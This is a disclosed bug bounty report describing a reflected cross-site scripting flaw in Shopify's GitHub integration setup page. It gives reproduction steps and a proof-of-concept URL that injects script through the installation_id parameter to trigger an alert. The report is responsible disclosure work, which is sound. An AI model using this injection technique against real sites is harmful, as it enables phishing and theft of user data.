# Reflected XSS online-store-git.shopifycloud.com

## Report Details
- **Report ID**: 1410459
- **URL**: https://hackerone.com/reports/1410459
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-11-25T21:55:34.325Z
- **Disclosed**: 2022-01-20T19:45:25.922Z

## Reporter
- **Username**: 0xbepresent
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Summary:
Hello, I hope you are having a good day!,

There is a feature called "Shopify Github Integration", it helps to associate a GitHub account to a Shopify  store. In the Github connection proccess there is a URL [https://online-store-git.shopifycloud.com](https://online-store-git.shopifycloud.com) which is vulnerable to XXS reflected.

## Shops Used to Test:
- devpresent.myshopify.com

## Relevant Request IDs:
- x-request-id: 1cdb077b2d319acccd1237c1142cf89b

## Steps To Reproduce:
1. Visit the next [URL](https://online-store-git.shopifycloud.com/github/setup?installation_id=20913869%7d%7d%7d%29%3b%7d%3balert%281337%29%3bif%281==2%29%7bk=new%20Promise%28function%28%29%7bif%281==2%29%7bv=%7be:%201&setup_action=install)
```https://online-store-git.shopifycloud.com/github/setup?installation_id=20913869%7d%7d%7d%29%3b%7d%3balert%281337%29%3bif%281==2%29%7bk=new%20Promise%28function%28%29%7bif%281==2%29%7bv=%7be:%201&setup_action=install```
2. Enter an owner or staff credentials.
3. The XSS will fire.

## Supporting Material:
- xss.png
- poc.mp4

## Impact

There are several impacts.

- The attacker could use Javascript in order to do phishing attacks.
- Steal data.
- Reflected JS

May you be well,
-Misa

## Attachments
- xss.png
- poc.mp4
